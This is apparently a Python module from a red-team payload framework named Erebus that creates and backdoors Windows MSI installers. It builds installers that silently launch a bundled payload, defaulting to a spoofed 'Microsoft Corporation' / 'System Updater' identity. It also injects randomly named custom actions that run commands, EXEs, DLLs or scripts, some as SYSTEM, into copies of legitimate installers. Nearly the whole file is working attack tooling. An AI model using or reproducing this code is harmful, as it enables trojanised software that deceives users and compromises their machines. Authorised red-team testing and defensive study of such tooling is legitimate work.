"""
MSI Packager Toolkit for Erebus Payload Wrapper

Creates, manipulates, and weaponises Windows Installer (MSI) databases.

Capabilities
~~~~~~~~~~~~
* Fresh MSI generation via WiX (wixl) with per-User / per-Machine scopes
* MSI backdooring — inject custom actions into an existing installer
* Multiple attack vectors: command exec, EXE launch, DLL load, .NET,
  VBScript / JScript, file drop
* Proper CAB-stream bundling when inserting extra files
* Cross-platform: msilib on Windows, msitools CLI on Linux
* Intelligent sequence-slot discovery to avoid collisions
"""

import fnmatch
import os
import pathlib
import random
import re
import shutil
import string
import struct
import subprocess
import sys
import tempfile
import uuid

# ---------------------------------------------------------------------------
# Platform-conditional imports
# ---------------------------------------------------------------------------
if sys.platform == "win32":
    try:
        import msilib
    except ImportError:
        msilib = None
else:
    msilib = None

try:
    import olefile
except ImportError:
    olefile = None


# ============================================================================
# Action code catalogue — straight from the Windows Installer SDK docs
# https://learn.microsoft.com/en-us/windows/win32/msi/summary-list-of-all-custom-action-types
# ============================================================================

class PackagerActionCodes:
    """Numeric type-codes used in the MSI CustomAction table."""
    DEFERRED_IMPERSONATED     = 1250   # deferred, runs as calling user
    DEFERRED_SYSTEM           = 3298   # deferred, runs as SYSTEM
    IMMEDIATE_IMPERSONATED    = 226    # immediate, calling user
    EMBEDDED_VBS              = 1126   # VBScript stored inline in CustomAction.Target
    BINARY_VBS                = 70     # VBScript fetched from Binary table
    EMBEDDED_JS               = 1125   # JScript inline
    BINARY_JS                 = 69     # JScript from Binary table
    BINARY_EXE                = 1218   # EXE from Binary table (deferred)
    IMMEDIATE_EXE             = 194    # EXE from Binary table (immediate)
    DLL_ENTRYPOINT            = 65     # native / .NET DLL entry point
    FILE_TABLE_EXE            = 1746   # execute a previously-dropped file
    PROPERTY_SET              = 51     # set a directory / property


# ============================================================================
# InstallerDatabase — wraps msilib with lifecycle + batch-insert semantics
# ============================================================================

class InstallerDatabase:
    """
    Managed wrapper around an ``msilib`` MSI database handle.

    *   Supports batch staging of records prior to a single commit
    *   Provides generic table scanning with automatic column-type inference
    *   Locates free sequence slots to avoid collisions when injecting actions
    *   Clean open → stage → commit → close lifecycle
    """

    DEFAULT_GUARD = "NOT REMOVE"

    # Tables whose sorted column index matters for ordered reads
    _SORT_HINTS = {
        "InstallExecuteSequence": 2,
        "InstallUISequence":      2,
        "File":                   7,
        "Feature":                4,
        "Media":                  0,
    }

    def __init__(self, msi_path: str, writable: bool = True):
        self._path = str(msi_path)
        self._handle = None
        self._staged: dict = {}
        mode = msilib.MSIDBOPEN_TRANSACT if writable else msilib.MSIDBOPEN_READONLY
        self._handle = msilib.OpenDatabase(self._path, mode)

    # -- properties ----------------------------------------------------------

    @property
    def handle(self):
        """Raw ``msilib`` database object — escape hatch for edge-cases."""
        return self._handle

    # -- lifecycle -----------------------------------------------------------

    def persist(self):
        """Flush staged records, commit, and close the database."""
        if self._handle is None:
            return
        try:
            self._write_staged()
            self._handle.Commit()
        finally:
            self._handle.Close()
            self._handle = None

    def abandon(self):
        """Close without committing any pending work."""
        if self._handle is not None:
            self._handle.Close()
            self._handle = None

    # -- batch record staging ------------------------------------------------

    def stage(self, table: str, values):
        """Queue *values* (a tuple) for later batch insertion into *table*."""
        self._staged.setdefault(table, []).append(tuple(values))

    def _write_staged(self):
        """Insert every staged record into the database in one pass."""
        for table, rows in self._staged.items():
            data = rows
            if table == "Binary":
                # Binary table entries need msilib.Binary wrapper for paths
                data = [(r[0], msilib.Binary(r[1])) for r in rows]
            try:
                msilib.add_data(self._handle, table, data)
            except (AssertionError, Exception):
                # A few tables (e.g. CustomAction) may choke on an extra
                # ExtendedType column — retry with the tail trimmed.
                if table == "CustomAction":
                    msilib.add_data(self._handle, table, [r[:-1] for r in rows])
                else:
                    raise
        self._staged.clear()

    # -- generic table reader ------------------------------------------------

    def read_table(self, table: str, sort: bool = True) -> list:
        """
        Return every row in *table* as a list-of-lists.

        Column types are auto-detected so integers come back as ``int``.
        When *sort* is ``True`` and the table has a known sort column the
        rows are returned ordered.
        """
        assert self._handle is not None, "Database is closed"

        view = self._handle.OpenView(f"SELECT * FROM {table}")
        view.Execute(None)

        type_rec = view.GetColumnInfo(msilib.MSICOLINFO_TYPES)
        n_cols = type_rec.GetFieldCount()
        kinds = []
        for idx in range(1, n_cols + 1):
            flag = type_rec.GetString(idx)
            kinds.append("i" if flag[0] in ("i", "I") else "s")

        rows = []
        while True:
            rec = view.Fetch()
            if rec is None:
                break
            row = []
            for idx in range(n_cols):
                if kinds[idx] == "i":
                    row.append(rec.GetInteger(idx + 1))
                else:
                    row.append(rec.GetString(idx + 1))
            rows.append(row)
        view.Close()

        if sort:
            col = self._SORT_HINTS.get(table)
            if col is not None and rows:
                rows.sort(key=lambda r: r[col])

        return rows

    # -- sequence arithmetic -------------------------------------------------

    def locate_free_slots(self, seq_table: str, after: str, before: str) -> list:
        """
        Walk *seq_table* and return unused sequence numbers that sit between
        the actions named *after* and *before*.
        """
        rows = self.read_table(seq_table)

        lo = hi = -1
        occupied = set()
        for row in rows:
            action_name = row[0]
            seq = row[2]
            occupied.add(seq)
            if action_name.lower() == after.lower():
                lo = seq
            elif action_name.lower() == before.lower():
                hi = seq

        if lo == -1 or hi == -1:
            lo, hi = 6400, 6600

        free = [n for n in range(hi - 1, lo, -1) if n not in occupied]
        return free if free else [6599, 6598, 6597, 6596, 6595]

    # -- direct SQL convenience ----------------------------------------------

    def run_sql(self, sql: str, record=None):
        """Execute a single SQL statement on the database."""
        view = self._handle.OpenView(sql)
        view.Execute(record)
        view.Close()

    def embed_stream(self, stream_name: str, file_on_disk: str):
        """Insert *file_on_disk* into the Binary table under *stream_name*."""
        sql = f"INSERT INTO Binary (Name, Data) VALUES ('{stream_name}', ?)"
        view = self._handle.OpenView(sql)
        rec = msilib.CreateRecord(1)
        rec.SetStream(1, str(file_on_disk))
        view.Execute(rec)
        view.Close()

    def wire_action(self, action_id: str, type_code: int, source: str,
                    target: str, guard: str = None, slot: int = None):
        """
        Insert a CustomAction row **and** its InstallExecuteSequence entry.
        """
        if guard is None:
            guard = self.DEFAULT_GUARD
        if slot is None:
            free = self.locate_free_slots(
                "InstallExecuteSequence", "InstallInitialize", "InstallFinalize"
            )
            slot = free[0] if free else 6599

        self.run_sql(
            f"INSERT INTO CustomAction (Action, Type, Source, Target) "
            f"VALUES ('{action_id}', {type_code}, '{source}', '{target}')"
        )
        self.run_sql(
            f"INSERT INTO InstallExecuteSequence (Action, Condition, Sequence) "
            f"VALUES ('{action_id}', '{guard}', {slot})"
        )

    # -- CAB streaming (for file-drop attacks) -------------------------------

    def embed_cab(self, cab, disk_id: int, final_seq: int = 0):
        """
        Compress files staged in *cab* (``msilib.CAB``), stream the
        resulting cabinet into the database, and register it in the Media
        table.
        """
        if final_seq == 0:
            final_seq = cab.index

        tmp_cab = tempfile.mktemp()
        msilib.FCICreate(tmp_cab, cab.files)
        msilib.add_data(
            self._handle, "Media",
            [(disk_id, final_seq, None, "#" + cab.name, None, None)],
        )
        try:
            msilib.add_stream(self._handle, cab.name, tmp_cab)
        finally:
            if os.path.isfile(tmp_cab):
                os.unlink(tmp_cab)
        self._handle.Commit()


# ============================================================================
# Lightweight msilib.Feature / msilib.Directory shims
#
# These wrappers allow *reusing* an existing Feature / Directory row that
# was read from a target MSI without inserting duplicate rows.
# ============================================================================

if msilib is not None:
    class _ShimFeature(msilib.Feature):
        """Wraps an existing Feature record so ``set_current()`` works."""

        def __init__(self, db, id, title="", desc="", display=0,
                     level=1, parent=None, directory=None, attributes=0):
            self.id = id
            if parent and hasattr(parent, "id"):
                parent = parent.id

    class _ShimDirectory(msilib.Directory):
        """
        Directory helper that skips the INSERT into the Directory table —
        needed when patching an existing MSI rather than building from scratch.
        """

        _file_seq = 0  # shared across instances

        def __init__(self, db, cab, basedir, physical, logical, default,
                     componentflags=None):
            logical = _normalise_tag(logical)
            self.db = db
            self.cab = cab
            self.basedir = basedir
            self.physical = physical
            self.logical = logical
            self.component = None
            self.short_names = set()
            self.ids = set()
            self.keyfiles = {}
            self.componentflags = componentflags
            self.absolute = (
                os.path.join(basedir.absolute, physical)
                if basedir else physical
            )

        def add_file(self, file, src=None, version=None, language=None):
            if not self.component:
                self.start_component(self.logical, msilib.current_feature, 0)
            if not src:
                src = file
                file = os.path.basename(file)
            absolute = os.path.join(self.absolute, src)
            assert not re.search(r'[\?|><:/*]"', file)
            logical = self.keyfiles.get(file)
            sequence, logical = self.cab.append(absolute, file, logical)
            assert logical not in self.ids
            self.ids.add(logical)
            short = self.make_short(file)
            full = f"{short}|{file}"
            file_size = os.stat(absolute).st_size
            attributes = 512
            _ShimDirectory._file_seq += 1
            msilib.add_data(
                self.db, "File",
                [(logical, self.component, full, file_size, version,
                  language, attributes, _ShimDirectory._file_seq)],
            )
            return logical

        def glob(self, pattern, exclude=None):
            try:
                entries = os.listdir(self.absolute)
            except OSError:
                return []
            if pattern[:1] != ".":
                entries = [f for f in entries if f[0] != "."]
            entries = fnmatch.filter(entries, pattern)
            for f in entries:
                if exclude and f in exclude:
                    continue
                self.add_file(f)
            return entries
else:
    # Stubs when msilib is unavailable (Linux)
    _ShimFeature = None
    _ShimDirectory = None


# ============================================================================
# Standalone helpers
# ============================================================================

def _rand_tag(lo: int = 6, hi: int = 12) -> str:
    """Random alphanumeric tag that starts with a letter (MSI requirement)."""
    length = random.randint(lo, hi) if hi > lo else lo
    pool = string.ascii_letters + string.digits
    tag = "".join(random.choice(pool) for _ in range(length))
    if tag[0] in string.digits:
        tag = random.choice(string.ascii_letters) + tag[1:]
    return tag


def _normalise_tag(raw: str) -> str:
    """Coerce an arbitrary string into a legal MSI identifier."""
    allowed = set(string.ascii_letters + string.digits + "._")
    out = "".join(c if c in allowed else "_" for c in raw)
    if out and out[0] in (string.digits + "."):
        out = "_" + out
    return out


def _probe_clr_header(filepath) -> bool:
    """Return ``True`` when the PE at *filepath* contains a CLR data directory."""
    try:
        with open(filepath, "rb") as fh:
            if fh.read(2) != b"MZ":
                return False
            fh.seek(0x3C)
            pe_off = struct.unpack("<I", fh.read(4))[0]
            fh.seek(pe_off)
            if fh.read(4) != b"PE\0\0":
                return False
            fh.seek(pe_off + 24)
            magic = struct.unpack("<H", fh.read(2))[0]
            if magic == 0x10B:          # PE32
                clr_field = pe_off + 24 + 208
            elif magic == 0x20B:        # PE32+
                clr_field = pe_off + 24 + 224
            else:
                return False
            fh.seek(clr_field)
            return struct.unpack("<I", fh.read(4))[0] != 0
    except Exception:
        return False


# ============================================================================
# Attack-vector resolver
# ============================================================================

def _resolve_vector(payload_path, attack_type: str, entry_point: str,
                    command_args: str):
    """
    Map a human-readable *attack_type* string to a ``(type_code, target)``
    pair suitable for the MSI CustomAction table.
    """
    if attack_type in ("load-dll", "dotnet"):
        # Same type code for native and managed DLLs
        code = PackagerActionCodes.DLL_ENTRYPOINT
        target = entry_point or "DllEntry"
        return code, target

    if attack_type == "run-exe":
        return PackagerActionCodes.BINARY_EXE, (command_args or "")

    if attack_type == "script":
        ext = pathlib.Path(payload_path).suffix.lower()
        if ext in (".vbs", ".vbe"):
            code = PackagerActionCodes.BINARY_VBS
        elif ext in (".js", ".jse"):
            code = PackagerActionCodes.BINARY_JS
        else:
            raise ValueError(f"Unrecognised script extension: {ext}")
        if not entry_point:
            raise ValueError("Script vectors need an entry_point function name")
        return code, entry_point

    # Default — deferred command execution
    return PackagerActionCodes.DEFERRED_IMPERSONATED, (command_args or "")


# ============================================================================
# Public API — build_msi
# ============================================================================

def build_msi(build_path: pathlib.Path,
              app_name: str = "System Updater",
              manufacturer: str = "Microsoft Corporation",
              install_scope: str = "User",
              *,
              # Extended parameters the plugin layer may pass
              product_name: str = None,
              version: str = None,
              use_admin: bool = None,
              action_type: str = None,
              action_args: str = None,
              output_name: str = None) -> pathlib.Path:
    """
    Generate a fresh MSI installer that bundles and auto-launches a payload.

    Parameters
    ----------
    build_path : pathlib.Path
        Root build directory; expects ``payload/`` subdirectory with an EXE.
    app_name : str
        Display name used in Add/Remove Programs.
    manufacturer : str
        Vendor string baked into the MSI metadata.
    install_scope : str
        ``"User"`` (AppData, no elevation) or ``"Machine"`` (Program Files, admin).
    product_name, version, use_admin, action_type, action_args, output_name
        Extended overrides accepted for plugin-layer compatibility.

    Returns
    -------
    pathlib.Path
        Absolute path to the generated ``.msi`` file.
    """
    # Merge extended overrides
    if product_name:
        app_name = product_name
    if use_admin is not None:
        install_scope = "Machine" if use_admin else "User"

    pkg_version = version or "1.0.0.0"
    upgrade_code = str(uuid.uuid4())
    comp_guid = str(uuid.uuid4())

    # --- Locate payload EXE ------------------------------------------------
    payload_dir = build_path / "payload"
    payload_exe = payload_dir / "erebus.exe"
    if not payload_exe.exists():
        try:
            payload_exe = next(
                p for p in payload_dir.iterdir()
                if p.is_file() and p.suffix.lower() == ".exe"
            )
        except StopIteration:
            raise RuntimeError("No .exe payload found in the payload directory")

    # --- Determine output path ---------------------------------------------
    msi_filename = output_name or "erebus.msi"
    msi_path = build_path / "container" / "msi" / msi_filename
    msi_path.parent.mkdir(parents=True, exist_ok=True)

    # --- Scope-dependent directory layout ----------------------------------
    if install_scope.lower() == "machine":
        folder_id = "ProgramFilesFolder"
        scope_attr = 'InstallScope="perMachine"'
    else:
        folder_id = "LocalAppDataFolder"
        scope_attr = 'InstallScope="perUser"'

    # --- Enumerate payload files into WiX <File> elements ------------------
    main_id = "PayloadEXE"
    file_elements = ""
    for item in payload_dir.iterdir():
        if not item.is_file() or item.name == msi_path.name:
            continue
        fid = main_id if item.name == payload_exe.name else f"F_{uuid.uuid4().hex[:8]}"
        file_elements += (
            f'                        <File Id="{fid}" '
            f'Source="{item.absolute()}" />\n'
        )

    # --- Compose WiX source ------------------------------------------------
    wxs_body = f"""\
<?xml version="1.0" encoding="utf-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="*" UpgradeCode="{upgrade_code}"
             Name="{app_name}" Version="{pkg_version}"
             Manufacturer="{manufacturer}" Language="1033">
        <Package InstallerVersion="200" Compressed="yes"
                 Comments="Installer" {scope_attr} />
        <Media Id="1" Cabinet="product.cab" EmbedCab="yes" />

        <Directory Id="TARGETDIR" Name="SourceDir">
            <Directory Id="{folder_id}">
                <Directory Id="INSTALLLOCATION" Name="{app_name}">
                    <Component Id="MainComponent" Guid="{comp_guid}">
                        <RegistryValue Root="HKCU"
                            Key="Software\\{manufacturer}\\{app_name}"
                            Name="installed" Type="integer" Value="1"
                            KeyPath="yes"/>
{file_elements}\
                    </Component>
                </Directory>
            </Directory>
        </Directory>

        <Feature Id="ProductFeature" Title="{app_name}" Level="1">
            <ComponentRef Id="MainComponent" />
        </Feature>

        <CustomAction Id="LaunchApp" FileKey="{main_id}"
                      ExeCommand="" Return="asyncNoWait" />
        <InstallExecuteSequence>
            <Custom Action="LaunchApp" After="InstallFinalize">
                NOT Installed
            </Custom>
        </InstallExecuteSequence>
    </Product>
</Wix>
"""

    # --- Compile with wixl -------------------------------------------------
    try:
        with tempfile.TemporaryDirectory() as td:
            wxs_file = pathlib.Path(td) / "installer.wxs"
            wxs_file.write_text(wxs_body, encoding="utf-8")
            subprocess.check_output(
                ["wixl", "-o", str(msi_path), str(wxs_file)],
                stderr=subprocess.STDOUT,
            )
        if not msi_path.exists():
            raise RuntimeError("wixl completed but MSI file was not produced")
        return msi_path

    except subprocess.CalledProcessError as exc:
        raise RuntimeError(
            f"MSI compilation failed:\n{exc.output.decode(errors='replace')}"
        )


# ============================================================================
# Public API — hijack_msi
# ============================================================================

def hijack_msi(source_msi: pathlib.Path,
               payload_path: pathlib.Path,
               build_path: pathlib.Path = None,
               custom_action_name: str = None,
               attack_type: str = "execute",
               entry_point: str = None,
               command_args: str = "",
               condition: str = "NOT REMOVE",
               *,
               # Plugin-layer aliases
               action_type: str = None,
               action_args: str = None,
               sequence: str = None,
               output_dir: pathlib.Path = None) -> pathlib.Path:
    """
    Inject a backdoor CustomAction into an existing MSI installer.

    The original file is never modified — a patched copy is written to the
    build output directory instead.

    Parameters
    ----------
    source_msi : pathlib.Path
        Legitimate MSI to clone and backdoor.
    payload_path : pathlib.Path
        Binary (EXE / DLL / script) to embed.
    build_path : pathlib.Path
        Root output directory (``container/msi/`` is appended automatically).
    attack_type : str
        One of ``"execute"``, ``"run-exe"``, ``"load-dll"``, ``"dotnet"``,
        ``"script"``.
    entry_point : str
        DLL export or script function name (required for dll / script vectors).
    command_args : str
        Command-line arguments for EXE / command vectors.
    condition : str
        MSI condition expression; defaults to ``"NOT REMOVE"``.

    Returns
    -------
    pathlib.Path
        Path to the patched MSI file.
    """
    # Merge plugin-layer aliases
    if action_type is not None:
        attack_type = action_type
    if action_args is not None:
        command_args = action_args
    if output_dir is not None:
        build_path = output_dir

    source_msi = pathlib.Path(source_msi)
    payload_path = pathlib.Path(payload_path)

    if not source_msi.exists():
        raise FileNotFoundError(f"Source MSI not found: {source_msi}")
    if not payload_path.exists():
        raise FileNotFoundError(f"Payload not found: {payload_path}")
    if build_path is None:
        raise ValueError("build_path / output_dir is required")

    build_path = pathlib.Path(build_path)

    # --- Prepare output copy -----------------------------------------------
    out_dir = build_path / "container" / "msi"
    out_dir.mkdir(parents=True, exist_ok=True)
    patched = out_dir / f"{source_msi.stem}-patched.msi"
    shutil.copy2(source_msi, patched)

    ca_name = custom_action_name or _rand_tag(6, 12)
    stream_tag = _rand_tag(6, 12)

    # Resolve the attack vector to type-code + target string
    type_code, target = _resolve_vector(
        payload_path, attack_type, entry_point, command_args
    )

    # ----- Windows path (msilib available) ---------------------------------
    if sys.platform == "win32" and msilib is not None:
        db = InstallerDatabase(str(patched), writable=True)
        try:
            db.embed_stream(stream_tag, str(payload_path))
            db.wire_action(ca_name, type_code, stream_tag, target,
                           guard=condition)
            db.persist()
        except Exception:
            db.abandon()
            raise
        return patched

    # ----- Linux path (msitools CLI) ---------------------------------------
    try:
        return _hijack_via_msitools(
            patched, payload_path, ca_name, stream_tag,
            type_code, target, condition,
        )
    except FileNotFoundError as exc:
        raise RuntimeError(
            f"msitools not found.  Install with: apt-get install msitools\n"
            f"Detail: {exc}"
        )


def _hijack_via_msitools(patched_msi, payload_path, ca_name, stream_tag,
                          type_code, target, condition):
    """Re-build *patched_msi* with an injected custom action using CLI tools."""
    with tempfile.TemporaryDirectory() as td:
        td = pathlib.Path(td)

        # 1. Extract existing content
        extract = td / "extracted"
        extract.mkdir()
        subprocess.check_call(
            ["msiextract", "-C", str(extract), str(patched_msi)],
            stderr=subprocess.STDOUT,
        )

        # 2. Export all existing tables
        tables_dir = td / "tables"
        tables_dir.mkdir()
        try:
            raw = subprocess.check_output(
                ["msiinfo", "tables", str(patched_msi)],
                text=True, stderr=subprocess.STDOUT,
            )
            for tbl in raw.strip().splitlines():
                tbl = tbl.strip()
                if not tbl:
                    continue
                try:
                    content = subprocess.check_output(
                        ["msiinfo", "export", str(patched_msi), tbl],
                        text=True, stderr=subprocess.STDOUT,
                    )
                    (tables_dir / f"{tbl}.idt").write_text(content)
                except subprocess.CalledProcessError:
                    pass
        except subprocess.CalledProcessError:
            pass

        # 3. Patch CustomAction table
        ca_idt = tables_dir / "CustomAction.idt"
        if ca_idt.exists():
            body = ca_idt.read_text()
        else:
            body = "Action\tType\tSource\tTarget\n"
            body += "s72\ti2\tS64\tS0\n"
            body += "CustomAction\tAction\n"
        body += f"{ca_name}\t{type_code}\t{stream_tag}\t{target}\n"
        ca_idt.write_text(body)

        # 4. Patch InstallExecuteSequence
        ies_idt = tables_dir / "InstallExecuteSequence.idt"
        if ies_idt.exists():
            body = ies_idt.read_text()
        else:
            body = "Action\tCondition\tSequence\n"
            body += "s72\tS255\tI2\n"
            body += "InstallExecuteSequence\tAction\n"
        body += f"{ca_name}\t{condition}\t6599\n"
        ies_idt.write_text(body)

        # 5. Prepare the binary payload stream
        streams_dir = td / "streams"
        streams_dir.mkdir()
        payload_blob = streams_dir / f"Binary.{stream_tag}"
        shutil.copy2(payload_path, payload_blob)

        # 6. Rebuild via msibuild
        rebuilt = td / "rebuilt.msi"
        cmd = ["msibuild", str(rebuilt)]
        for idt in sorted(tables_dir.glob("*.idt")):
            cmd.extend(["-i", str(idt)])
        cmd.extend(["-a", f"Binary.{stream_tag}", str(payload_blob)])

        subprocess.check_call(cmd, stderr=subprocess.STDOUT)
        shutil.copy2(rebuilt, patched_msi)
        return patched_msi


# ============================================================================
# Public API — add_multiple_files_to_msi
# ============================================================================

def add_multiple_files_to_msi(source_msi: pathlib.Path,
                               files_to_add: list,
                               build_path: pathlib.Path = None,
                               target_dir: str = "TARGETDIR",
                               *,
                               output_dir: pathlib.Path = None) -> pathlib.Path:
    """
    Bundle extra files into an existing MSI using a new embedded CAB.

    This discovers an existing Feature and Directory in the target MSI so the
    new files are placed alongside the installer's original content rather
    than in a detached component tree.

    Parameters
    ----------
    source_msi : pathlib.Path
        MSI to augment.
    files_to_add : list[pathlib.Path]
        Files to pack into the installer.
    build_path / output_dir : pathlib.Path
        Root output directory.
    target_dir : str
        MSI directory identifier where files should land.

    Returns
    -------
    pathlib.Path
        Path to the modified MSI.
    """
    if output_dir is not None:
        build_path = output_dir

    source_msi = pathlib.Path(source_msi)
    if not source_msi.exists():
        raise FileNotFoundError(f"Source MSI not found: {source_msi}")
    if build_path is None:
        raise ValueError("build_path / output_dir is required")

    build_path = pathlib.Path(build_path)
    out_dir = build_path / "container" / "msi"
    out_dir.mkdir(parents=True, exist_ok=True)

    bundled = out_dir / f"{source_msi.stem}-bundled.msi"
    shutil.copy2(source_msi, bundled)

    if sys.platform != "win32" or msilib is None:
        raise RuntimeError("File bundling requires Windows with msilib")

    db = InstallerDatabase(str(bundled), writable=True)
    try:
        _bundle_files_with_cab(db, files_to_add, target_dir)
        db.persist()
    except Exception:
        db.abandon()
        raise

    return bundled


def _bundle_files_with_cab(db: InstallerDatabase, files: list,
                           target_dir_id: str):
    """
    Internal helper — discovers existing Feature / Directory and creates a
    proper CAB stream containing *files*.
    """
    raw = db.handle
    cab_label = _rand_tag(5, 15)
    comp_name = _rand_tag(5, 15)

    cab = msilib.CAB(cab_label)

    # --- Discover a suitable Feature to attach to --------------------------
    features = db.read_table("Feature")
    feat_comps = db.read_table("FeatureComponents")
    components = db.read_table("Component")
    directories = db.read_table("Directory")
    existing_files = db.read_table("File")
    medias = db.read_table("Media")

    feature = None
    dir_id = None

    # Try to reuse the Feature / Component / Directory of the first file
    if existing_files:
        first_comp = existing_files[0][1]
        for fc in feat_comps:
            if feature is not None:
                break
            if fc[1] == first_comp:
                for ft in features:
                    if ft[0] == fc[0]:
                        feature = _ShimFeature(
                            raw, id=ft[0], title=ft[2], desc=ft[3],
                            display=ft[4], level=ft[5],
                            parent=ft[1], directory=ft[6],
                            attributes=ft[7],
                        )
                        for c in components:
                            if c[0] == first_comp:
                                dir_id = c[2]
                                break
                        break

    if feature is None:
        new_id = _rand_tag(5, 15)
        level = (features[-1][5] + 1) if features else 1
        feature = msilib.Feature(
            db=raw, id=new_id, parent="", title="", desc="",
            display=0, level=level, attributes=0,
        )

    feature.set_current()

    if dir_id is None:
        dir_id = comp_name

    # Reset the per-instance sequence counter to the last file sequence found
    _ShimDirectory._file_seq = existing_files[-1][-1] if existing_files else 0

    # --- Determine physical path from the first valid file -----------------
    first_file = next((f for f in files if pathlib.Path(f).exists()), None)
    if first_file is None:
        return  # nothing to bundle

    physical = str(pathlib.Path(first_file).parent)

    shim_dir = _ShimDirectory(raw, cab, None, physical, dir_id, "SourceDir")

    for fp in files:
        fp = pathlib.Path(fp)
        if not fp.exists():
            continue
        if fp.is_file():
            shim_dir.add_file(fp.name)
        else:
            shim_dir.glob("**/**")

    # --- Compress and stream the CAB into the database ---------------------
    next_disk = (medias[-1][0] + 1) if medias else 2
    db.embed_cab(cab, next_disk, _ShimDirectory._file_seq)


# ============================================================================
# Public API — create_custom_action (thin convenience wrapper)
# ============================================================================

def create_custom_action(db,
                         action_name: str,
                         action_type: int,
                         source: str,
                         target: str,
                         condition: str = "NOT REMOVE",
                         sequence_num: int = None,
                         **_kwargs) -> None:
    """
    Insert a CustomAction + sequence entry into an already-open database.

    *db* may be either a raw ``msilib`` database handle or an
    ``InstallerDatabase`` instance.
    """
    if isinstance(db, InstallerDatabase):
        db.wire_action(action_name, action_type, source, target,
                       guard=condition, slot=sequence_num)
        return

    # Raw msilib handle path
    if sequence_num is None:
        try:
            wrapper = InstallerDatabase.__new__(InstallerDatabase)
            wrapper._handle = db
            wrapper._staged = {}
            free = wrapper.locate_free_slots(
                "InstallExecuteSequence", "InstallInitialize", "InstallFinalize"
            )
            sequence_num = free[0] if free else 6599
        except Exception:
            sequence_num = 6599

    view_ca = db.OpenView(
        f"INSERT INTO CustomAction (Action, Type, Source, Target) "
        f"VALUES ('{action_name}', {action_type}, '{source}', '{target}')"
    )
    view_ca.Execute(None)
    view_ca.Close()

    view_seq = db.OpenView(
        f"INSERT INTO InstallExecuteSequence (Action, Condition, Sequence) "
        f"VALUES ('{action_name}', '{condition}', {sequence_num})"
    )
    view_seq.Execute(None)
    view_seq.Close()


# ============================================================================
# Legacy aliases — keep the old class names importable so existing
# references elsewhere in the codebase continue to work
# ============================================================================

ErebusActionTypes = PackagerActionCodes


class ErebusInstallerToolkit:
    """Thin shim mapping old static helpers to the new module-level functions."""
    generate_identifier = staticmethod(_rand_tag)
    sanitize_identifier = staticmethod(_normalise_tag)
    detect_dotnet_assembly = staticmethod(_probe_clr_header)

    @staticmethod
    def find_free_sequence_slots(db, table, start_action, end_action):
        wrapper = InstallerDatabase.__new__(InstallerDatabase)
        wrapper._handle = db
        wrapper._staged = {}
        return wrapper.locate_free_slots(table, start_action, end_action)
